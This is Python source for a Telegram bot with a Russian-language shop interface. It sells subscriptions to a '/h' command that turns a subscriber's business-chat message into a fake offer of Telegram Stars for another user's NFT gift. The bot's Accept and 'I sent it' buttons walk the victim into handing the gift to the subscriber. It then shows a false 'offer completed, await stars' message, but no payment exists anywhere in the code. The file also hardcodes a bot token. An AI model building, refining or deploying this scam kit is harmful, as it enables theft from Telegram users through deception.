import asyncio
import re
import sqlite3
import datetime
import os
import random
import string
from pathlib import Path
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions, FSInputFile
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "9126496920:AAH3R7wayQ6cUE0JWLt3SVDSuOSq34gD0NA"
ADMIN_ID = 8808258682
SELLER_TG = "s3rp3ntcoders"
SUPPORT_TG = "iserpentt"
# ======================

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

class AdminState(StatesGroup):
    waiting_days = State()
    waiting_keygen_days = State()
    waiting_gift_id = State()
    waiting_broadcast = State()
    waiting_key = State()
    waiting_promocode = State()
    waiting_promo_days = State()

# === БАЗА ДАННЫХ ===
data_dir = Path(os.environ.get("DATA_DIR", "."))
try:
    data_dir.mkdir(parents=True, exist_ok=True)
    db_path = data_dir / "shop.db"
    test_file = data_dir / ".test_write"
    test_file.touch()
    test_file.unlink()
except Exception:
    db_path = Path("shop.db")

def get_db():
    conn = sqlite3.connect(db_path, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

conn = get_db()
cur = conn.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT DEFAULT NULL,
    full_name TEXT DEFAULT NULL,
    sub_until TEXT DEFAULT NULL
)
""")
cur.execute("""
CREATE TABLE IF NOT EXISTS keys (
    key_code TEXT PRIMARY KEY,
    date_until TEXT
)
""")
cur.execute("""
CREATE TABLE IF NOT EXISTS promos (
    code TEXT PRIMARY KEY,
    days INTEGER
)
""")
cur.execute("""
CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    action TEXT,
    date TEXT
)
""")
cur.execute("""
CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT
)
""")
conn.commit()

def log_action(user_id, action):
    date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    cur.execute("INSERT INTO logs (user_id, action, date) VALUES (?, ?, ?)", (user_id, action, date))
    conn.commit()

def get_setting(key, default=None):
    cur.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = cur.fetchone()
    return row[0] if row else default

def set_setting(key, value):
    cur.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit()

def save_user(user):
    cur.execute("""
        INSERT INTO users (user_id, username, full_name) 
        VALUES (?, ?, ?) 
        ON CONFLICT(user_id) DO UPDATE SET 
        username=excluded.username, full_name=excluded.full_name
    """, (user.id, user.username, user.full_name))
    conn.commit()

def check_sub(user_id):
    cur.execute("SELECT sub_until FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    if not row or row[0] is None: return False
    return datetime.datetime.now().strftime("%Y-%m-%d") <= row[0]

# === МЕНЮ ===
def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛒 Купить ключ", callback_data="buy")],
        [InlineKeyboardButton(text="💰 Прайсы", callback_data="prices")],
        [InlineKeyboardButton(text="📖 Туториал", callback_data="tutorial")],
        [InlineKeyboardButton(text="👤 Мой профиль", callback_data="profile")],
        [InlineKeyboardButton(text="🆘 Поддержка", url=f"https://t.me/{SUPPORT_TG}")]
    ])

def buy_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✉️ Написать @{SELLER_TG}", url=f"https://t.me/{SELLER_TG}")],
        [InlineKeyboardButton(text="🔑 Ввести ключ", callback_data="enter_key")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
    ])

async def change_message(message: types.Message, text: str, keyboard: InlineKeyboardMarkup = None, link: str = None):
    kwargs = {}
    if keyboard: kwargs['reply_markup'] = keyboard
    if link: kwargs['link_preview_options'] = LinkPreviewOptions(url=link, prefer_large_media=True)
    try: await message.edit_text(text=text, **kwargs)
    except:
        try: await message.delete()
        except: pass
        await message.answer(text=text, **kwargs)

# === СТАРТ ===
@dp.message(Command("start"))
async def start(message: types.Message):
    save_user(message.from_user)
    log_action(message.from_user.id, "start")
    
    if message.from_user.id != ADMIN_ID and get_setting("notify_new_users", "1") == "1":
        try:
            await bot.send_message(
                ADMIN_ID, 
                f"🔔 <b>Новый юзер!</b>\n\n"
                f"👤 {message.from_user.full_name}\n"
                f"🔗 @{message.from_user.username}\n"
                f"ID: <code>{message.from_user.id}</code>"
            )
        except: pass

    await message.answer(
        "👋 <b>Добро пожаловать в магазин!</b>\n\n"
        "🎁 Чтобы получить <b>3 дня бесплатной подписки</b>, напишите @s3rp3ntcoders\n\n"
        "Выберите действие:",
        reply_markup=main_menu()
    )

# === СЕКРЕТНАЯ КОМАНДА /menu ===
@dp.message(Command("menu"))
async def admin_menu_command(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("👑 <b>Главное меню админа</b>\n\nВыберите действие:", reply_markup=admin_main_menu())

def admin_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Список юзеров", callback_data="admin_users")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="🛠 Кейген", callback_data="admin_keygen")],
        [InlineKeyboardButton(text="🎁 Выдать по ID", callback_data="admin_gift")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="🔑 Список ключей", callback_data="admin_keys")],
        [InlineKeyboardButton(text="💾 Скачать базу", callback_data="admin_db")],
        [InlineKeyboardButton(text="🎟 Промокоды", callback_data="admin_promo_menu")],
        [InlineKeyboardButton(text="📝 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text="🔔 Уведомления", callback_data="admin_notify_toggle")]
    ])

@dp.callback_query(F.data == "admin_main")
async def admin_to_main(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    await callback.message.edit_text("👑 <b>Главное меню админа</b>\n\nВыберите действие:", reply_markup=admin_main_menu())

# === УВЕДОМЛЕНИЯ ===
@dp.callback_query(F.data == "admin_notify_toggle")
async def admin_notify_toggle(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    current = get_setting("notify_new_users", "1")
    new_val = "0" if current == "1" else "1"
    set_setting("notify_new_users", new_val)
    status = "ВКЛ" if new_val == "1" else "ВЫКЛ"
    await callback.message.edit_text(
        f"🔔 <b>Уведомления о новых юзерах:</b> {status}\n\n"
        f"Нажми на кнопку ниже, чтобы переключить:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Переключить", callback_data="admin_notify_toggle")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_main")]
        ])
    )

# === АДМИН: СПИСОК ЮЗЕРОВ ===
@dp.callback_query(F.data == "admin_users")
async def admin_users(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    
    cur.execute("SELECT user_id, username, full_name, sub_until FROM users ORDER BY sub_until DESC")
    users = cur.fetchall()
    if not users:
        await callback.message.edit_text("❌ Пользователей пока нет.", reply_markup=admin_main_menu())
        return

    text = "👥 <b>Все юзеры:</b>\n\n"
    kb = []
    today = datetime.datetime.now().strftime("%Y-%m-%d")

    for u in users:
        sub = u['sub_until']
        status = "✅" if sub and sub >= today else "❌"
        text += f"{status} {u['full_name']} (@{u['username']})\n"
        kb.append([InlineKeyboardButton(text=f"{status} {u['full_name']}", callback_data=f"admin_user_{u['user_id']}")])

    kb.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_main")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@dp.callback_query(F.data.startswith("admin_user_"))
async def admin_user_info(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    user_id = int(callback.data.split("_")[2])
    
    cur.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = cur.fetchone()
    if not user:
        await callback.message.edit_text("❌ Не найден.", reply_markup=admin_main_menu())
        return

    today = datetime.datetime.now().strftime("%Y-%m-%d")
    sub = user['sub_until']
    status = "✅ Активна" if sub and sub >= today else "❌ Истекла"
    sub_text = sub if sub else "Нет"

    text = (
        f"👤 <b>Инфо о юзере</b>\n\n"
        f"🔹 <b>Имя:</b> {user['full_name']}\n"
        f"🔹 <b>Юзер:</b> @{user['username']}\n"
        f"🔹 <b>ID:</b> <code>{user['user_id']}</code>\n"
        f"🔹 <b>Подписка:</b> {sub_text} ({status})"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Продлить", callback_data=f"admin_extend_{user_id}")],
        [InlineKeyboardButton(text="❌ Забрать", callback_data=f"admin_revoke_{user_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_users")]
    ])
    await callback.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data.startswith("admin_extend_"))
async def admin_extend(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    user_id = int(callback.data.split("_")[2])
    
    await state.update_data(target_user=user_id)
    await state.set_state(AdminState.waiting_days)
    
    await callback.message.edit_text(
        "➕ <b>Продление подписки</b>\n\nВведите количество дней:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_main")]])
    )

@dp.message(AdminState.waiting_days)
async def process_extend_days(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    days = int(message.text)
    data = await state.get_data()
    user_id = data.get("target_user")
    await state.clear()

    cur.execute("SELECT sub_until FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    today = datetime.datetime.now()

    if row and row['sub_until'] and row['sub_until'] > today.strftime("%Y-%m-%d"):
        base = datetime.datetime.strptime(row['sub_until'], "%Y-%m-%d")
        new_date = base + datetime.timedelta(days=days)
    else:
        new_date = today + datetime.timedelta(days=days)
    
    new_date_str = new_date.strftime("%Y-%m-%d")
    cur.execute("UPDATE users SET sub_until = ? WHERE user_id = ?", (new_date_str, user_id))
    conn.commit()

    try:
        await bot.send_message(user_id, f"👑 <b>Администратор продлил вашу подписку!</b>\n\nТеперь она активна до: <b>{new_date_str}</b>")
    except: pass

    await message.answer(f"✅ Продлено до {new_date_str}.", reply_markup=admin_main_menu())

@dp.callback_query(F.data.startswith("admin_revoke_"))
async def admin_revoke(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    user_id = int(callback.data.split("_")[2])
    cur.execute("UPDATE users SET sub_until = NULL WHERE user_id = ?", (user_id,))
    conn.commit()
    try:
        await bot.send_message(user_id, "❌ <b>Ваша подписка была отменена администратором.</b>")
    except: pass
    await callback.answer("Подписка забрана.", show_alert=True)

# === АДМИН: КЕЙГЕН ===
@dp.callback_query(F.data == "admin_keygen")
async def admin_keygen(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    await callback.message.edit_text(
        "🛠 <b>Кейген</b>\n\nВведите количество дней для ключа:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_main")]])
    )
    await state.set_state(AdminState.waiting_keygen_days)

@dp.message(AdminState.waiting_keygen_days)
async def keygen_process(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    
    days = int(message.text)
    await state.clear()

    chars = string.ascii_letters + string.digits
    key = "key-" + "".join(random.choice(chars) for _ in range(12))
    until = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")

    cur.execute("INSERT INTO keys (key_code, date_until) VALUES (?, ?)", (key, until))
    conn.commit()

    await message.answer(
        f"✅ <b>Ключ создан!</b>\n\n🔑 <code>{key}</code>\n📅 До: <b>{until}</b> ({days} дней)",
        reply_markup=admin_main_menu()
    )

# === АДМИН: СПИСОК КЛЮЧЕЙ ===
@dp.callback_query(F.data == "admin_keys")
async def admin_keys(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    cur.execute("SELECT key_code, date_until FROM keys")
    keys = cur.fetchall()
    if not keys:
        await callback.message.edit_text("❌ Ключей пока нет.", reply_markup=admin_main_menu())
        return

    text = "🔑 <b>Созданные ключи:</b>\n\n"
    for k in keys[-20:]:
        text += f"<code>{k['key_code']}</code> — до {k['date_until']}\n"

    await callback.message.edit_text(text, reply_markup=admin_main_menu())

# === АДМИН: СТАТИСТИКА ===
@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    cur.execute("SELECT COUNT(*) FROM users")
    total = cur.fetchone()[0]
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    cur.execute("SELECT COUNT(*) FROM users WHERE sub_until >= ?", (today,))
    active = cur.fetchone()[0]

    text = (
        f"📊 <b>Статистика магазина:</b>\n\n"
        f"👥 Всего юзеров: <b>{total}</b>\n"
        f"✅ С подпиской: <b>{active}</b>\n"
        f"❌ Без подписки: <b>{total - active}</b>"
    )
    await callback.message.edit_text(text, reply_markup=admin_main_menu())

# === АДМИН: ВЫДАТЬ ПО ID ===
@dp.callback_query(F.data == "admin_gift")
async def admin_gift(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    await callback.message.edit_text(
        "🎁 <b>Выдать по ID</b>\n\nВведите ID и дни (например: <code>123456789 30</code>):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_main")]])
    )
    await state.set_state(AdminState.waiting_gift_id)

@dp.message(AdminState.waiting_gift_id)
async def process_gift(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2 or not args[0].isdigit() or not args[1].isdigit():
        await message.answer("❌ Введите: ID и дни (например: 123456789 30)")
        return
    user_id, days = int(args[0]), int(args[1])
    await state.clear()

    new_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
    cur.execute("UPDATE users SET sub_until = ? WHERE user_id = ?", (new_date, user_id))
    conn.commit()

    try:
        await bot.send_message(user_id, f"👑 <b>Администратор выдал вам подписку!</b>\n\nОна активна до: <b>{new_date}</b>")
    except: pass

    await message.answer(f"✅ Выдано до {new_date}.", reply_markup=admin_main_menu())

# === АДМИН: РАССЫЛКА ===
@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    await callback.message.edit_text(
        "📢 <b>Рассылка</b>\n\nВведите текст, который отправится всем юзерам:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_main")]])
    )
    await state.set_state(AdminState.waiting_broadcast)

@dp.message(AdminState.waiting_broadcast)
async def process_broadcast(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    text = message.text
    await state.clear()

    cur.execute("SELECT user_id FROM users")
    users = cur.fetchall()
    
    success = 0
    failed = 0
    
    for u in users:
        try:
            await bot.send_message(u['user_id'], text)
            success += 1
            await asyncio.sleep(0.05) 
        except Exception:
            failed += 1
    
    await message.answer(
        f"✅ <b>Рассылка завершена!</b>\n\n"
        f"📤 Отправлено: {success}\n"
        f"❌ Не доставлено: {failed}",
        reply_markup=admin_main_menu()
    )

# === АДМИН: СКАЧАТЬ БАЗУ ===
@dp.callback_query(F.data == "admin_db")
async def admin_db(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    try:
        file = FSInputFile(db_path)
        await callback.message.answer_document(file, caption="💾 <b>Ваша база данных</b>")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка: {e}")

# === АДМИН: ПРОМОКОДЫ ===
@dp.callback_query(F.data == "admin_promo_menu")
async def admin_promo_menu(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    cur.execute("SELECT code, days FROM promos")
    promos = cur.fetchall()
    
    text = "🎟 <b>Промокоды:</b>\n\n"
    for p in promos: text += f"<code>{p['code']}</code> — {p['days']} дней\n"
    if not promos: text = "❌ Нет промокодов."
        
    kb = [[InlineKeyboardButton(text="➕ Создать промокод", callback_data="admin_newpromo")],
          [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_main")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@dp.callback_query(F.data == "admin_newpromo")
async def admin_newpromo(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    await callback.message.edit_text("🎟 Введите текст промокода (например: FREE3):", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_promo_menu")]]))
    await state.set_state(AdminState.waiting_promocode)

@dp.message(AdminState.waiting_promocode)
async def process_promocode(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    await state.update_data(code=message.text.strip())
    await state.set_state(AdminState.waiting_promo_days)
    await message.answer("Сколько дней дает этот промокод?")

@dp.message(AdminState.waiting_promo_days)
async def process_promo_days(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID or not message.text.isdigit(): return
    days = int(message.text)
    data = await state.get_data()
    code = data['code']
    await state.clear()
    
    cur.execute("INSERT OR REPLACE INTO promos (code, days) VALUES (?, ?)", (code, days))
    conn.commit()
    await message.answer(f"✅ Промокод <code>{code}</code> на {days} дней создан!", reply_markup=admin_main_menu())

# === АДМИН: ЛОГИ ===
@dp.callback_query(F.data == "admin_logs")
async def admin_logs(callback: types.CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID: return
    cur.execute("SELECT user_id, action, date FROM logs ORDER BY id DESC LIMIT 30")
    logs = cur.fetchall()
    
    text = "📝 <b>Последние 30 действий:</b>\n\n"
    for l in logs:
        text += f"{l['date']} | {l['user_id']} | {l['action']}\n"
        
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_main")]])
    await callback.message.edit_text(text or "Пусто", reply_markup=kb)

# === КНОПКИ ШОПА ===
@dp.callback_query(F.data == "main_menu")
async def to_main(callback: types.CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("👋 Выберите действие:", reply_markup=main_menu())

@dp.callback_query(F.data == "tutorial")
async def tutorial(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        "📖 <b>Как сделать оффер:</b>\n\n"
        "1. Зайдите в личный чат с человеком.\n"
        "2. Напишите:\n"
        "<code>/h [ссылка] [цена] [stars] [ru]</code>\n\n"
        "📌 Пример:\n"
        "<code>/h https://t.me/nft/CloverPin-193200 1200 stars ru</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]])
    await callback.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data == "profile")
async def profile(callback: types.CallbackQuery):
    await callback.answer()
    cur.execute("SELECT sub_until FROM users WHERE user_id = ?", (callback.from_user.id,))
    row = cur.fetchone()
    if not row or not row[0] or row[0] < datetime.datetime.now().strftime("%Y-%m-%d"):
        text = "👤 <b>Ваш профиль</b>\n\n❌ У вас нет активной подписки."
    else:
        text = f"👤 <b>Ваш профиль</b>\n\n✅ Подписка активна до: <b>{row[0]}</b>"
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))

@dp.callback_query(F.data == "buy")
async def buy(callback: types.CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("💎 <b>Покупка ключа</b>", reply_markup=buy_menu())

@dp.callback_query(F.data == "enter_key")
async def enter_key_prompt(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("🔑 <b>Введите ключ:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="buy")]]))
    await state.set_state(AdminState.waiting_key)

@dp.message(AdminState.waiting_key)
async def process_key(message: types.Message, state: FSMContext):
    user_key = message.text.strip()
    await state.clear()
    save_user(message.from_user)
    log_action(message.from_user.id, f"key_activate:{user_key}")

    cur.execute("SELECT date_until FROM keys WHERE key_code = ?", (user_key,))
    row = cur.fetchone()
    if row:
        cur.execute("UPDATE users SET sub_until = ? WHERE user_id = ?", (row[0], message.from_user.id))
        conn.commit()
        await message.answer(f"✅ <b>Ключ активирован!</b>\nДействует до: <b>{row[0]}</b>", reply_markup=main_menu())
        return

    cur.execute("SELECT days FROM promos WHERE code = ?", (user_key,))
    promo = cur.fetchone()
    if promo:
        days = promo['days']
        new_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
        cur.execute("UPDATE users SET sub_until = ? WHERE user_id = ?", (new_date, message.from_user.id))
        conn.commit()
        await message.answer(f"✅ <b>Промокод активирован!</b>\nТеперь подписка до: <b>{new_date}</b>", reply_markup=main_menu())
        return

    await message.answer("❌ Неверный ключ или промокод!", reply_markup=buy_menu())

@dp.callback_query(F.data == "prices")
async def prices(callback: types.CallbackQuery):
    await callback.answer()
    text = "💰 <b>Прайсы:</b>\n\n▫️ 2 недели — 49 руб.\n▫️ 1 месяц — 99 руб.\n▫️ 6 месяцев — 299 руб.\n▫️ 1 год — 499 руб.\n▫️ Навсегда — 699 руб."
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"✉️ Написать @{SELLER_TG}", url=f"https://t.me/{SELLER_TG}")],[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]])
    await callback.message.edit_text(text, reply_markup=kb)

# === ОФФЕР ===
@dp.business_message(F.text.startswith("/h"))
async def make_offer(message: types.Message):
    save_user(message.from_user)
    if not check_sub(message.from_user.id):
        try: await message.delete()
        except: pass
        await message.answer("⛔ У вас нет подписки!")
        return

    args = message.text.split()
    if len(args) < 5: return
    link, price, lang = args[1], args[2], args[4].lower()
    
    match = re.search(r'/nft/([^-]+)-(\d+)', link)
    gift_name = f"{match.group(1)} #{match.group(2)}" if match else "Collectible"
    sender_name = message.from_user.first_name
    sender_username = message.from_user.username or str(message.from_user.id)

    if lang == "ru":
        text = f"Пользователь @{sender_username} ({sender_name}) предлагает вам {price} ⭐ за подарок {gift_name}."
        btn_accept, btn_decline = "Принять", "Отклонить"
    else:
        text = f"User @{sender_username} ({sender_name}) offers you {price} ⭐ for the gift {gift_name}."
        btn_accept, btn_decline = "Accept", "Decline"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=f"✅ {btn_accept}", callback_data=f"accept_{price}_{gift_name}_{sender_username}"),
        InlineKeyboardButton(text=f"❌ {btn_decline}", callback_data="decline_offer")
    ]])
    try: await message.edit_text(text=text, reply_markup=keyboard, link_preview_options=LinkPreviewOptions(url=link, prefer_large_media=True))
    except:
        try: await message.delete()
        except: pass
        await message.answer(text=text, reply_markup=keyboard, link_preview_options=LinkPreviewOptions(url=link, prefer_large_media=True))

@dp.callback_query(F.data.startswith("accept_"))
async def accept(callback: types.CallbackQuery):
    await callback.answer()
    parts = callback.data.split("_", 3)
    price, gift_name, sender_username = parts[1], parts[2], parts[3]
    text_accepted = f"✅ <b>Предложение принято!</b>\n\nНажмите «📤 Отправить», передайте {gift_name} пользователю @{sender_username}.\n\nПосле передачи поступит {price} ⭐."
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Отправить", url=f"https://t.me/{sender_username}")],
        [InlineKeyboardButton(text="✅ Я отправил", callback_data=f"sent_{price}_{gift_name}_{sender_username}")]
    ])
    await change_message(callback.message, text_accepted, keyboard)

@dp.callback_query(F.data.startswith("sent_"))
async def sent_gift(callback: types.CallbackQuery):
    await callback.answer()
    parts = callback.data.split("_", 3)
    price, gift_name, sender_username = parts[1], parts[2], parts[3]
    
    await change_message(
        callback.message, 
        f"✅ <b>Оффер успешно завершен!</b>\n\n"
        f"Подарок {gift_name} передан пользователю @{sender_username}.\n"
        f"Ожидайте поступления {price} ⭐ на ваш баланс."
    )
    
    try:
        cur.execute("SELECT user_id FROM users WHERE username = ?", (sender_username,))
        seller_row = cur.fetchone()
        if seller_row:
            seller_id = seller_row['user_id']
            await bot.send_message(
                seller_id, 
                f"🎉 <b>Ваш оффер выкуплен!</b>\n\n"
                f"Покупатель отправил вам {gift_name}.\n"
                f"Сумма: {price} ⭐\n\n"
                f"Проверьте свой профиль в Telegram."
            )
    except Exception as e:
        print(f"Ошибка уведомления продавца: {e}")

@dp.callback_query(F.data == "decline_offer")
async def decline(callback: types.CallbackQuery):
    await callback.answer()
    await change_message(callback.message, "❌ <b>Оффер отклонен.</b>")

async def main():
    print("Бот запущен.")
    await dp.start_polling(bot, allowed_updates=["message", "callback_query", "business_message"])

if __name__ == "__main__":
    asyncio.run(main())
